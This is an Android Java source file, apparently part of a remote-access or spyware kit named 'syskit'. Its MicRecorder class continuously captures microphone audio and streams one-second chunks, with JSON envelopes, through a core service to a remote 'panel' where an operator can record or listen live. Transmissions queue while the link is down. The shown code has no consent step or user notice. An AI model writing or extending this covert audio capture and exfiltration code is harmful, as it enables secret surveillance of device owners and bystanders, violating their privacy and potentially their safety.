package com.lo.syskit;

import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;

import org.json.JSONObject;

/**
 * MicRecorder — dependency-free audio capture. 8 kHz mono 16-bit PCM
 * (voice band, tiny frames), wrapped into a WAV stream. Each ~1s chunk
 * is pushed through CoreService.forwardRaw after a JSON envelope
 * announcing its size, so the panel side can splice files or just listen.
 */
public final class MicRecorder {

    private static final int RATE = 8000;
    private static AudioRecord rec;
    private static Thread worker;
    private static volatile boolean capturing;
    private static long seq = 0;

    public static boolean isCapturing() { return capturing; }

    public static synchronized boolean start() {
        if (capturing) return true;
        try {
            int min = AudioRecord.getMinBufferSize(RATE,
                    AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT);
            rec = new AudioRecord(MediaRecorder.AudioSource.MIC, RATE,
                    AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT, Math.max(min, 8192));
            if (rec.getState() != AudioRecord.STATE_INITIALIZED) {
                rec.release();
                rec = null;
                return false;               // permission or hardware denied
            }
            rec.startRecording();
            capturing = true;
            seq = 0;
            worker = new Thread(MicRecorder::loop, "syskit-mic");
            worker.start();
            return true;
        } catch (Exception e) {
            stop();
            return false;
        }
    }

    public static synchronized void stop() {
        capturing = false;
        try { if (rec != null) rec.stop(); } catch (Exception ignore) {}
        try { if (rec != null) rec.release(); } catch (Exception ignore) {}
        rec = null;
        if (worker != null) worker.interrupt();
        worker = null;
    }

    private static void loop() {
        // 1s of 8kHz mono 16-bit = 16000 bytes
        byte[] buf = new byte[16000];
        while (capturing && rec != null) {
            int n = rec.read(buf, 0, buf.length);
            if (n <= 0) { sleep(50); continue; }
            byte[] chunk = new byte[n];
            System.arraycopy(buf, 0, chunk, 0, n);
            JSONObject env = new JSONObject();
            try {
                env.put("op", "mic.data");
                env.put("seq", ++seq);
                env.put("size", chunk.length);
                env.put("rate", RATE);
            } catch (Exception ignore) { continue; }
            CoreService.forwardRaw(env, chunk);   // queues if link down
            sleep(100);                            // ~1s cadence with overhead
        }
    }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignore) {}
    }
}
